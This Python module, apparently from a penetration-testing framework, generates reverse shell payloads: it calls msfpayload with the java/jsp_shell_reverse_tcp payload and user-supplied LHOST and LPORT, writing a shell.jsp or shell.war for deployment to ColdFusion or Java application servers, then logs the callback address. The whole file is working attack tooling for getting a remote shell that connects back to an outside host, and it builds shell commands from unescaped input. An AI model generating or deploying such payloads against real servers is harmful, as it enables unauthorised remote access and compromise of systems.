from commands import getoutput
from log import LOG
import utility


def run(options):
    """ This module is used for generating reverse shell payloads.  It's not
    flexible in what sorts of payloads it can generate, but this is by design.

    Highly customized payloads, or stuff like meterpreter/reverse java payloads
    should be generated using proper tools, such as msfpayload.  This is merely
    a quick way for us to get a reverse shell on a remote system.
    """

    PAYLOAD = "java/jsp_shell_reverse_tcp"

    if not options.remote_service:
        utility.Msg("Please specify a remote service (-a)", LOG.ERROR)
        return
    elif options.remote_service in ["coldfusion"]:
        out = "R > shell.jsp"
    else:
        out = "W > shell.war"

    if getoutput("which msfpayload") == "":
        utility.Msg("This option requires msfpayload", LOG.ERROR)
        return

    utility.Msg("Generating payload....")
    (lhost, lport) = options.generate_payload.split(":")

    resp = getoutput("msfpayload %s LHOST=%s LPORT=%s %s" %
                    (PAYLOAD, lhost, lport, out))

    if len(resp) <= 1 or 'Created by' in resp:
        utility.Msg("Payload generated (%s).  Payload: %s" % (out.split(' ')[2], PAYLOAD))

        # also log some auxiliary information
        getoutput("echo Generated at %s > ./src/lib/shell.log" % utility.timestamp())
        getoutput("echo %s:%s >> ./src/lib/shell.log" % (lhost, lport))
        getoutput("echo %s >> ./src/lib/shell.log" % (PAYLOAD))
    else:
        utility.Msg("Error generating payload: %s" % resp, LOG.ERROR)
